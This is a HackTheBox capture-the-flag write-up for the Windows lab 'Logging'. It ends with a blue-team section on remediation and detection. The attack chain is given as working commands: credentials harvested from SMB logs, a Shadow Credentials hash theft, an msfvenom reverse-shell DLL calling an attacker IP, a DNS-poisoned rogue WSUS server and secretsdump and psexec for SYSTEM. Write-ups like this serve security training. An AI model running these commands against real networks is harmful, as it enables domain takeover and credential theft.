---
title: Logging
os: Windows
difficulty: Medium
tags:
  - Active Directory
  - Information Disclosure
  - Shadow Credentials
  - DLL Sideloading
  - ADCS
  - ESC17
  - Rogue WSUS Server
  - Privilege Escalation
---

# 🛡️ HTB - Logging (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Logging
- **Operating System:** Windows Server 2019
- **Difficulty:** Medium
- **Vulnerabilities:** Plaintext Credentials in Public SMB Share Logs, Shadow Credentials on gMSA Account, DLL Sideloading in UpdateMonitor, ADCS ESC17 (Rogue WSUS Server Spoofing)

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.23.177
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-19 13:54 UTC
Nmap scan report for 10.129.23.177
Host is up (0.22s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 20:54:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
```

- 🔍 *The target hosts Active Directory services. We are provided with initial domain credentials:* `wallace.everette / Welcome2026@`
- 🔍 *Verifying the credentials via SMB using NetExec:*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@'
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb)
SMB         10.129.23.177   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
```

- 🔍 *Listing domain user accounts:*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --users
```

```text
SMB         10.129.23.177   445    DC01             svc_recovery                  2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             jaylee.clifton                2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             wallace.everette              2026-04-16 23:09:50 0
```

- 🔍 *Inspecting SMB shares:*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --shares
```

```text
SMB         10.129.23.177   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.23.177   445    DC01             Logs            READ
SMB         10.129.23.177   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.23.177   445    DC01             SYSVOL          READ            Logon server share
```

- 🔍 *We have read access to a non-standard share named `Logs`. Listing its contents:*

```bash
smbclient //10.129.23.177/Logs -U 'logging.htb\wallace.everette%Welcome2026@'
```

```text
smb: \> ls
  .                                   D        0  Thu Apr 16 23:10:09 2026
  ..                                  D        0  Thu Apr 16 23:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
```

---

## Step 2 - Enumeration

- 🔍 *We retrieve and inspect the log files. In `IdentitySync_Trace_20260219.log`, we find plaintext service credentials:*

```text
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
```

- 🔍 *We discover credentials for the account `svc_recovery`: `Em3rg3ncyPa$$2025`.*
- 🔍 *Checking the Active Directory trust path in BloodHound, we find `svc_recovery` has `GenericWrite` permissions over the Group Managed Service Account (gMSA) `msa_health$`:*
  `svc_recovery --(GenericWrite)--> msa_health$`
- 🔍 *The `svc_recovery` account belongs to the `Protected Users` group, which prevents standard NTLM/SMB authentications, returning `STATUS_ACCOUNT_RESTRICTION`. To bypass this, we request a Kerberos Ticket Granting Ticket (TGT):*

```bash
getTGT.py 'logging.htb/svc_recovery:Em3rg3ncyPa$$2025' -dc-ip 10.129.24.106
export KRB5CCNAME=svc_recovery.ccache
```

> [!IMPORTANT]
> **Shadow Credentials Attack:**
> Since `svc_recovery` has `GenericWrite` permissions on `msa_health$`, we can modify the `msDS-KeyCredentialLink` attribute of `msa_health$`. By appending a trusted cryptographic public certificate that we generate, we can authenticate as the gMSA account using PKINIT (Kerberos cert authentication) and retrieve its NT password hash.

---

## Step 3 - Initial Foothold

- 🔍 *Executing the Shadow Credentials attack using `bloodyAD` with our Kerberos context:*

```bash
bloodyAD -u svc_recovery -k \
         -d logging.htb \
         --host dc01.logging.htb \
         add shadowCredentials msa_health$
```

```text
[+] KeyCredential generated with sha256 of RSA key: 6b872e5e15c4069dfa9b46b06e10e94d6def5ff6e3c75165fd47d924568cc104
[+] TGT stored in ccache file msa_health$_1J.ccache
NT: 603fc24ee01a9409f83c9d1d701485c5
```

- 🔍 *We successfully retrieve the NT password hash for `msa_health$`: `603fc24ee01a9409f83c9d1d701485c5`.*
- 🔍 *Logging into the host via WinRM using the gMSA account:*

```bash
evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

- 🔍 *The gMSA account has a restricted shell. We search for third-party programs in `C:\Program Files`:*

```powershell
*Evil-WinRM* PS C:\Program Files> ls
...
d-----        4/16/2026   4:10 PM                UpdateMonitor
```

- 🔍 *Checking permissions on the `UpdateMonitor` directory:*

```powershell
icacls "C:\Program Files\UpdateMonitor"
```

```text
C:\Program Files\UpdateMonitor logging\IT:(OI)(CI)(F)
```

- 🔍 *Users in the `IT` group have full access. The `IT` group contains the user `jaylee.clifton`.*
- 🔍 *Inspecting the `UpdateMonitor` logs in `C:\ProgramData\UpdateMonitor\Logs`:*

```powershell
cat C:\ProgramData\UpdateMonitor\Logs\monitor.log
```

```text
[2026-04-16 16:41:18] Checking for update on local server...
[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
```

> [!IMPORTANT]
> **UpdateMonitor DLL Hijacking / Sideloading:**
> The `UpdateMonitor.exe` service (running under `jaylee.clifton`'s context) looks for a local zip archive at `C:\ProgramData\UpdateMonitor\Settings_Update.zip`. When present, it automatically extracts it to `C:\Program Files\UpdateMonitor\bin\settings_update.dll` and loads the library. Since standard users can write to `C:\ProgramData\UpdateMonitor`, we can drop a malicious DLL wrapped in a zip archive to execute code as `jaylee.clifton`.

- 🔍 *We generate a reverse TCP shell DLL using msfvenom:*

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.169 LPORT=6666 -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
```

- 🔍 *Uploading the zip archive via our WinRM session:*

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip
```

- 🔍 *Catching the reverse shell on our Metasploit listener:*

```text
[*] Meterpreter session 1 opened (10.10.15.169:6666 -> 10.129.44.87:61364)
meterpreter > getuid
Server username: logging\jaylee.clifton
```

- 🔍 *Initial shell session established as `jaylee.clifton`.*

---

## Step 4 - Privilege Escalation

- 🔍 *To perform Active Directory queries, we extract a Kerberos TGT for `jaylee.clifton` using Rubeus:*

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

- 🔍 *Converting and exporting the ticket locally on our attacker machine:*

```bash
echo -n 'BASE64_TICKET' | base64 -d > jaylee.kirbi
ticketConverter.py jaylee.kirbi jaylee.ccache
export KRB5CCNAME=jaylee.ccache
```

- 🔍 *Checking for Active Directory Certificate Services (ADCS) templates:*

```powershell
certutil -v -template UpdateSrv
```

```text
  TemplatePropCommonName = UpdateSrv
  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
  TemplatePropGeneralFlags = 20241 (131649)
    CT_FLAG_MACHINE_TYPE -- 40 (64)
  Enhanced Key Usage
    Server Authentication (1.3.6.1.5.5.7.3.1)
```

> [!IMPORTANT]
> **ADCS Template Misconfiguration (ESC17 / Rogue WSUS Server):**
> The `UpdateSrv` template is vulnerable to ESC17. It allows the enrollee to supply the Subject Alternative Name (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`), is marked for machine enrollment (`CT_FLAG_MACHINE_TYPE`), and enforces `Server Authentication` EKU.
> 
> While we cannot use this to authenticate directly as users (since it lacks `Client Authentication` EKU), we can request a certificate for the host update server `wsus.logging.htb`. By poisoning the AD DNS mapping for `wsus` to point to our attacker IP, we can host a rogue WSUS update server. Since computers in the domain trust the CA-signed certificate, they will connect to us for updates, allowing us to push a malicious update payload executing as `NT AUTHORITY\SYSTEM`.

- 🔍 *We query the registry to confirm the configured WSUS update endpoint:*

```powershell
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
```

```text
WUServer    REG_SZ    https://wsus.logging.htb:8531
```

- 🔍 *Requesting a certificate for `wsus.logging.htb` using `Certify.exe`:*

```powershell
Certify.exe request /ca:dc01.logging.htb\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
```

- 🔍 *Exporting the certificate and converting it to PEM/PFX format:*

```bash
openssl pkcs12 -in wsus.pfx -clcerts -nokeys -out wsus.crt -nodes
openssl pkcs12 -in wsus.pfx -nocerts -out wsus.key -nodes
cat wsus.crt wsus.key > wsus_combined.pem
```

- 🔍 *Using `bloodyAD` to rewrite the DNS A record for `wsus` to target our IP:*

```bash
bloodyAD --host 10.129.245.130 -d logging.htb -k add dnsRecord wsus 10.10.15.169
```

- 🔍 *Verifying the redirection:*

```bash
nslookup wsus.logging.htb 10.129.245.130
```

```text
Name:   wsus.logging.htb
Address: 10.10.15.169
```

- 🔍 *Starting our rogue WSUS server using `wsuks` to deploy a command adding `msa_health$` to the Domain Admins group:*

```bash
sudo wsuks --serve-only \
    --WSUS-Server wsus.logging.htb \
    --tls-cert wsus_combined.pem \
    -I tun0 \
    -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'
```

- 🔍 *The target pulls and runs the update, triggering the command. We verify our gMSA account `msa_health$` is now a Domain Admin by logging in via WinRM:*

```bash
evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
```

- 🔍 *We extract the Domain Administrator's NT hash using secretsdump:*

```bash
secretsdump.py -hashes :603fc24ee01a9409f83c9d1d701485c5 'logging.htb/msa_health$@dc01.logging.htb'
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
```

- 🔍 *Gaining a system shell on the Domain Controller using psexec:*

```bash
getTGT.py logging.htb/Administrator -hashes ':a0c1d1bed9126632f5f1f2b3f790bdb5'
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass 'LOGGING.HTB/Administrator@dc01.logging.htb'
```

```text
C:\Windows\system32> whoami
nt authority\system
```

- 🔍 *Root access achieved.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Logging lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Plaintext Credentials Exposed in Public SMB Shares

> [!WARNING]
> **Vulnerability Profile:**
> The `Logs` SMB share was readable by all standard domain users and contained trace files exposing administrative service credentials (`svc_recovery`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Exposing service credentials in plaintext allows low-privileged attackers to gain lateral movement within the directory, access critical services, and target AD delegation structures.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove read access on sensitive logs directories for non-administrative accounts.
> - **Remediation:** Implement automated log-scrubbing tools to strip plaintext credential strings from diagnostic traces.
> - **Detection:** Set up detection rules monitoring access to shared files containing standard password-revealing substrings (`BindPass`, `password=`).

---

### 🔴 Insecure AD Object Write Delegation (GenericWrite)

> [!WARNING]
> **Vulnerability Profile:**
> The `svc_recovery` account has write permissions (`GenericWrite`) over the `msa_health$` computer object.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> GenericWrite access permits attackers to write certificates to the `msDS-KeyCredentialLink` attribute (Shadow Credentials), obtaining TGT sessions as the target object via PKINIT and escalating privileges.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove direct `GenericWrite` and `WriteDacl` permissions over computer/service objects from standard or service accounts.
> - **Detection:** Perform regular BloodHound directory audits to identify administrative control loops. Monitor Event ID 5136 for edits matching `msDS-KeyCredentialLink`.

---

### 🔴 Insecure Scheduled Task Executing Unverified DLLs

> [!WARNING]
> **Vulnerability Profile:**
> The `UpdateMonitor` scheduled task extracts a zip archive located in a world-writable path (`C:\ProgramData`) and loads a DLL (`settings_update.dll`) without checking its code signature.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Standard users can drop arbitrary payloads into the zip path, leading to immediate DLL hijacking and arbitrary command execution in the context of the task executor (`jaylee.clifton`).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enforce code signing verification (Authenticode) on the update binary before loading external library DLLs.
> - **Remediation:** Set rigid folder permissions restricting writes to `C:\ProgramData\UpdateMonitor` only to administrative accounts.
> - **Detection:** Track and alert on suspicious DLL load anomalies inside application sub-bin paths using EDR tools.

---

### 🔴 ADCS Template ESC17 (Rogue WSUS Server Spoofing)

> [!WARNING]
> **Vulnerability Profile:**
> The `UpdateSrv` certificate template allows the enrollee to supply the Subject Alternative Name (SAN) and is marked for machine authentication with Server Authentication EKU.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can mint valid transport certificates for the domain's update server (`wsus.logging.htb`), poison DNS tables, and deploy a rogue WSUS server. This allows them to push malicious updates that execute commands as `SYSTEM` on computers contacting the update endpoint.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable the `ENROLLEE_SUPPLIES_SUBJECT` flag on certificate templates containing Server Authentication EKU.
> - **Remediation:** Secure WSUS settings to force SSL communication and validate update packages against explicit trusted certificates.
> - **Detection:** Monitor DNS zone transfers and active A-record modifications targeting WSUS hostnames.
